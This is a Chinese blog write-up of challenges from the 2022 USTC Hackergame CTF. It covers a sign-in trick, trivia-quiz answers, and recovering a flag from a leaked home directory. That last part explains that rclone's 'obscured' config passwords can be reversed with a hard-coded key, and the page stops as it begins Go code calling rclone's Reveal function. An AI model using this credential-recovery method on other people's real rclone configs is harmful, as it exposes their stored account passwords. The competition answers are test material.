<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTF | 2022 USTC Hackergame WriteUp 0x01, MiaoTony,blog">
    <meta name="description" content="又是一年Hackergame，今年内卷严重，题目难度有所提升，同时也学到了许多。">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-159946730-1');
</script>


    <title>CTF | 2022 USTC Hackergame WriteUp 0x01 | MiaoTony&#39;s小窝</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
	
    <script src="/libs/jquery/jquery.min.js"></script>
    <script>
        //来个特效玩玩喵 20200123
        var titleTime;
        var OriginTitile = document.title;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '|ω·) 喵~快回来呀！';
                clearTimeout(titleTime);
            } else {
                document.title = '(/≧▽≦)/ Meow！';
                titleTime = setTimeout(function() {
        	    document.title = OriginTitile;
        }, 800);
    }
        });
    </script>
<meta name="generator" content="Hexo 6.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">MiaoTony&#39;s小窝</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">MiaoTony&#39;s小窝</div>
        <div class="logo-desc">
            
            喵~欢迎各位大佬的来访呀！
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Follow Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Follow Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTF | 2022 USTC Hackergame WriteUp 0x01</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        min-width: 240px;
        padding-left: 15px;
        padding-bottom: 30px;
    }

    .toc-widget .toc-title {
        padding: 30px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
	    max-height: 450px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/WriteUp/">
                                <span class="chip bg-color">WriteUp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-10-30
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    9.6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    43 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022183117109.png"></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p><strong>中国科学技术大学第九届信息安全大赛</strong></p>
<p><strong>比赛时间：</strong>北京时间 2022 年 10 月 22 日 中午 12:00 ～ 10 月 29 日 中午 12:00（共七天）；<a target="_blank" rel="noopener" href="http://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.10.23_Hackergame/files/hackergame2022.ics">添加到日历</a></p>
<p>为了让参赛的同学们更好地平衡学习和比赛，按照传统，我们将于 10 月 23 日（周日）晚 20:00 至 10 月 24 日（周一）早 8:00 期间关闭比赛平台。在此期间选手们可以好好休息，完成自己的作业，准备迎接新的一周。</p>
<p><strong>赛制：</strong> <strong>个人线上赛</strong>，解题模式，约 25 道题目，有实时排行榜。</p>
<p>比赛题目分为 4 类，分类如下：</p>
<ul>
<li>综合技能（general）</li>
<li>程序逆向与漏洞利用（binary）</li>
<li>密码学与数学（math）</li>
<li>网站安全（web）</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn/</a></p>
</blockquote>
<p><strong>一年一度的 USTC Hackergame 又来了喵！</strong></p>
<blockquote>
<p>顺便，喵喵往年的 Hackergame Writeup 详见：</p>
<p><a href="https://miaotony.xyz/2021/11/03/CTF_2021Hackergame/">CTF | 2021 USTC Hackergame WriteUp</a></p>
<p><a href="https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/">CTF | 2020 USTC Hackergame WriteUp</a></p>
</blockquote>
<p>今年由于这一周还有挺多事要忙，没那么多时间看题了</p>
<p>说是这么说，每天基本就只有晚上看题，一不小心就通宵了，<del>作息乱了，呜呜</del></p>
<p><strong>今年内卷严重，题目难度有所提升，同时也学到了许多。</strong></p>
<p>这篇题解 / writeup 准确来说更应该叫 解题过程及心路历程记录，顺序基本也是按做题顺序来的，<del>懒得重新调整了</del></p>
<p>当然还包括了一些赛后复现的题目，喵呜（</p>
<p>由于文章过长，分成了三篇：</p>
<ul>
<li><strong>0x01（本文）</strong>：签到，家目录里的秘密，HeiLang，Xcaptcha，旅行照片 2.0，Flag 自动机，光与影，线路板，Flag 的痕迹，LaTeX 机器人，猜数字，微积分计算小练习</li>
<li>0x02（<a href="https://miaotony.xyz/2022/10/30/CTF_2022Hackergame_0x02/">这里</a>）：企鹅拼盘，火眼金睛的小 E，安全的在线测评，杯窗鹅影，蒙特卡罗轮盘赌，片上系统，看不见的彼方</li>
<li>0x03（<a href="https://miaotony.xyz/2022/10/31/CTF_2022Hackergame_0x03/">这里</a>）：传达不到的文件，二次元神经网络，你先别急，惜字如金，量子藏宝图</li>
</ul>
<p>本文为<strong>第一篇</strong>，希望大家看了也能有所收获喵~</p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><blockquote>
<p>众所周知，签到题是一道手速题。</p>
<p>为了充分发挥出诸位因为各种原因而手速优异于常人的选手们的特长，我们精心设计了今年的签到题。进一步地，为了更细致地区分不同手速的选手，我们还通过详尽的调研及统计分析，将签下字符的时间限制分为了多个等级。只有最顶尖的手速选手，才能在 CPU 来得及反应之前顺利签下 2022，从而得到光荣的 flag！</p>
<p>提示：完成题目遇到困难？你可以参考 <a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2018-writeups/tree/master/official/qiandao">2018 年签到题题解</a>、<a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E7%AD%BE%E5%88%B0%E9%A2%98/README.md">2019 年签到题题解</a>、<a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E7%AD%BE%E5%88%B0/README.md">2020 年签到题题解</a> 和 <a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E7%AD%BE%E5%88%B0/README.md">2021 年签到题题解</a>。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:12022/">http://202.38.93.111:12022/</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022170907311.png"></p>
<p>哈哈，还是经典的签到题前端界面模板，不过今年居然用了 tensorflow 模型在前端做识别，真正的手写签到！（雾</p>
<p>瞄一眼源码，直接发包完事了</p>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:12022/?result=2022">http://202.38.93.111:12022/?result=2022</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022170831773.png"></p>
<h2 id="猫咪问答喵"><a href="#猫咪问答喵" class="headerlink" title="猫咪问答喵"></a>猫咪问答喵</h2><blockquote>
<p>加猫咪问答喵，参加喵咪问答谢谢喵。</p>
<p>提示：<strong>解出谜题不需要是科大在校学生</strong>。解题遇到困难？你可以参考以下题解：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md">2018 年猫咪问答题解</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94++/README.md">2020 年猫咪问答++ 题解</a></li>
<li>[2021 年猫咪问答 Pro Max 题解](<a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94">https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/猫咪问答</a> Pro Max/README.md)</li>
</ul>
<p><strong>如果你在解出本题的过程中遇到困难，那么可以先尝试后面的题目，不必按顺序做题。</strong></p>
<p><strong>补充说明 1：第 5 小题的答案中，域名的字母共有 6 个，各不相同，该域名于 1996 年创建。</strong></p>
</blockquote>
<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><blockquote>
<p>中国科学技术大学 NEBULA 战队（USTC NEBULA）是于何时成立的喵？<br>提示：格式为 YYYY-MM，例如 2038 年 1 月即为 2038-01。</p>
</blockquote>
<p>2017-03</p>
<p><a target="_blank" rel="noopener" href="https://cybersec.ustc.edu.cn/2022/0826/c23847a565848/page.htm">https://cybersec.ustc.edu.cn/2022/0826/c23847a565848/page.htm</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022171405223.png"></p>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><blockquote>
<p>2022 年 9 月，中国科学技术大学学生 Linux 用户协会（LUG @  USTC）在科大校内承办了软件自由日活动。除了专注于自由撸猫的主会场之外，还有一些和技术相关的分会场（如闪电演讲 Lightning  Talk）。其中在第一个闪电演讲主题里，主讲人于 slides 中展示了一张在 GNOME Wayland 下使用 Wayland  后端会出现显示问题的 KDE 程序截图，请问这个 KDE 程序的名字是什么？<br>提示：英文单词，首字母大写，其他字母小写。</p>
</blockquote>
<p>Kdenlive</p>
<p><a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/wiki/lug/events/sfd/">https://lug.ustc.edu.cn/wiki/lug/events/sfd/</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022193639092.png"></p>
<p><a target="_blank" rel="noopener" href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdf">https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV11e411M7t9/?vd_source=546b024b50a080c00e50bb2d8d4f416f">https://www.bilibili.com/video/BV11e411M7t9/?vd_source=546b024b50a080c00e50bb2d8d4f416f</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022194220679.png"></p>
<p>（笑死，评论区全是猫咪问答来的</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022194328715.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022194840308.png"></p>
<blockquote>
<p><strong>Kdenlive</strong> 是 <strong>KDE</strong> <strong>N</strong>on-<strong>L</strong>inear <strong>V</strong>ideo <strong>E</strong>ditor (KDE 非线性视频编辑工具) 的首字母缩写。它支持 GNU/Linux、Windows、macOS 和 BSD 等操作系统。</p>
</blockquote>
<p>唉原来是这样（</p>
<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><blockquote>
<p>22 年坚持，小 C 仍然使用着一台他从小用到大的 Windows 2000 计算机。那么，在不变更系统配置和程序代码的前提下，Firefox 浏览器能在 Windows 2000 下运行的最后一个大版本号是多少？<br>提示：格式为 2 位数字的整数。</p>
</blockquote>
<p>12</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhangxin09/article/details/11715053">https://blog.csdn.net/zhangxin09/article/details/11715053</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022172421579.png"></p>
<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><blockquote>
<p>你知道 PwnKit（CVE-2021-4034）喵？据可靠谣传，出题组的某位同学本来想出这样一道类似的题，但是发现 Linux  内核更新之后居然不再允许 argc 为 0 了喵！那么，请找出在 Linux 内核 master  分支（torvalds/linux.git）下，首个变动此行为的 commit 的 hash 吧喵！<br>提示：格式为 40 个字符长的 commit 的 SHA1 哈希值，字母小写，注意不是 merge commit。</p>
</blockquote>
<p>dcd46d897adb70d63e025f175a00a89797d31a43</p>
<p>CVE-2021-4034 在 2022/01/25 披露（Disclosure），<a target="_blank" rel="noopener" href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)</a></p>
<p>所以应该在这个时间后 Linux 内核才修复的，于是去 GitHub 上搜一下 commit history</p>
<p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/search?o=desc&amp;p=2&amp;q=argc+0&amp;s=committer-date&amp;type=commits">https://github.com/torvalds/linux/search?o=desc&amp;p=2&amp;q=argc+0&amp;s=committer-date&amp;type=commits</a></p>
<p>然后找到了这个 </p>
<p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43">exec: Force single empty string when argv is empty</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022173704235.png"></p>
<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><blockquote>
<p>通过监视猫咪在键盘上看似乱踩的故意行为，不出所料发现其秘密连上了一个 ssh 服务器，终端显示 <code>ED25519 key fingerprint is MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce.</code>，你知道猫咪在连接什么域名吗？<br>提示：填写形如 example.com 的二级域名，答案中不同的字母有 6 个。</p>
</blockquote>
<p>sdf.org</p>
<p>这题搜了老半天。。</p>
<p>咕咕噜带引号去搜</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022200757671.png"></p>
<p>找到 <a target="_blank" rel="noopener" href="https://docs.zeek.org/en/master/logs/ssh.html">https://docs.zeek.org/en/master/logs/ssh.html</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022200837974.png"></p>
<p><a target="_blank" rel="noopener" href="https://search.censys.io/hosts/205.166.94.16">https://search.censys.io/hosts/205.166.94.16</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022200937610.png"></p>
<p>whois 查一下确实是了</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022201005524.png"></p>
<p>好古老的 sdf 啊（</p>
<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><blockquote>
<p>中国科学技术大学可以出校访问国内国际网络从而允许云撸猫的“网络通”定价为 20 元一个月是从哪一天正式实行的？<br>提示：格式为 YYYY-MM-DD，例如 2038 年 1 月 1 日，即为 2038-01-01。</p>
</blockquote>
<p><del>2011-01-01</del></p>
<p>2003-03-01</p>
<p>搜了下 中科大 网络通，发现了个好古董的 <a target="_blank" rel="noopener" href="http://wlt.ustc.edu.cn/cgi-bin/ip">登录界面</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022174034784.png"></p>
<p>然后搜到了个 <a target="_blank" rel="noopener" href="https://slidesplayer.com/slide/11551400/">ppt / slide</a>，里面有更古老的登录界面。。<del>（不过感觉也只是把背景删了吧</del></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022174731909.png"></p>
<p>最后在这里找到了个 <a target="_blank" rel="noopener" href="https://netfee.ustc.edu.cn/faq/">https://netfee.ustc.edu.cn/faq/</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022180350809.png"></p>
<p><strong>但是发现不对！！！！！</strong></p>
<p>然后找到了 张焕发 老师的 ppt，翻了半天看了 USTC 的网络架构，唔。。没啥用</p>
<p>然后搜到了官网的 <a target="_blank" rel="noopener" href="https://www.ustc.edu.cn/info/1057/4931.htm">关于实行新的网络费用分担办法的通知</a></p>
<p>然后一想，可以去互联网档案馆啊，在网络通的 faq 里翻到了 <a target="_blank" rel="noopener" href="http://web.archive.org/web/20070909083832/http://netfee.ustc.edu.cn/ylxia/help/faq/faq_feestandard.htm">http://web.archive.org/web/20070909083832/http://netfee.ustc.edu.cn/ylxia/help/faq/faq_feestandard.htm</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022202126409.png"></p>
<p>（哇，感觉那时候算挺领先了</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022202250993.png"></p>
<p><del>一定是染上了 红人喵 病毒</del></p>
<h2 id="家目录里的秘密"><a href="#家目录里的秘密" class="headerlink" title="家目录里的秘密"></a>家目录里的秘密</h2><blockquote>
<p>实验室给小 K 分配了一个高性能服务器的账户，为了不用重新配置 VSCode, Rclone 等小 K 常用的生产力工具，最简单的方法当然是把自己的家目录打包拷贝过去。</p>
<p>但是很不巧，对存放于小 K 电脑里的 Hackergame 2022 的 flag 觊觎已久的 Eve 同学恰好最近拿到了这个服务器的管理员权限（通过觊觎另一位同学的敏感信息），于是也拿到了小 K 同学家目录的压缩包。</p>
<p>然而更不巧的是，由于 Hackergame 部署了基于魔法的作弊行为预知系统，Eve 同学还未来得及解压压缩包就被 Z 同学提前抓获。</p>
<p>为了证明 Eve 同学不良企图的危害性，你能在这个压缩包里找到重要的 flag 信息吗？</p>
<p><strong>公益广告：题目千万条，诚信第一条！解题不合规，同学两行泪。</strong></p>
</blockquote>
<h3 id="VS-Code-里的-flag"><a href="#VS-Code-里的-flag" class="headerlink" title="VS Code 里的 flag"></a>VS Code 里的 flag</h3><p>直接 grep</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> flag<span class="token punctuation">{</span> <span class="token builtin class-name">.</span> -aR<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022210735248.png"></p>
<h3 id="Rclone-里的-flag"><a href="#Rclone-里的-flag" class="headerlink" title="Rclone 里的 flag"></a>Rclone 里的 flag</h3><p><code>.config/rclone/rclone.conf</code></p>
<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">flag2</span><span class="token punctuation">]</span></span>
<span class="token key attr-name">type</span> <span class="token punctuation">=</span> <span class="token value attr-value">ftp</span>
<span class="token key attr-name">host</span> <span class="token punctuation">=</span> <span class="token value attr-value">ftp.example.com</span>
<span class="token key attr-name">user</span> <span class="token punctuation">=</span> <span class="token value attr-value">user</span>
<span class="token key attr-name">pass</span> <span class="token punctuation">=</span> <span class="token value attr-value">tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>瞄了眼 rclone 文档</p>
<blockquote>
<p><strong>rclone obscure</strong></p>
<p>In the rclone config file, human-readable passwords are obscured. Obscuring them is done by encrypting them and writing them out in base64. This is <strong>not</strong> a secure way of encrypting these passwords as rclone can decrypt them - it is to prevent “eyedropping”</p>
<p><a target="_blank" rel="noopener" href="https://rclone.org/commands/rclone_obscure/">https://rclone.org/commands/rclone_obscure/</a></p>
</blockquote>
<p>这里感觉就是通过 obscure 命令混淆后的密码，解码出来应该就是 flag 了</p>
<p>他文档说了 rclone 自己可以解密，那就找找哪里可以整了</p>
<p>rclone 论坛里的一个帖子 <a target="_blank" rel="noopener" href="https://forum.rclone.org/t/rclone-obscure-password-what-does-it-do/12692">Rclone obscure password, what does it do?</a> 也提到了这个</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221024204231341.png"></p>
<p>再看 obscure 这部分的源码 <a target="_blank" rel="noopener" href="https://github.com/rclone/rclone/blob/master/fs/config/obscure/obscure.go">fs/config/obscure/obscure.go</a></p>
<p>这里面的 <code>Reveal</code> 函数便是解密的部分，可以看到用了硬编码的密钥</p>
<p>于是就直接改一改源码，调用 <code>Reveal</code> 函数把 <code>pass</code> 解密就完事了</p>
<p><strong>Exp:</strong></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// Package obscure contains the Obscure and Reveal commands</span>
<span class="token comment">// package obscure</span>
<span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"crypto/aes"</span>
	<span class="token string">"crypto/cipher"</span>
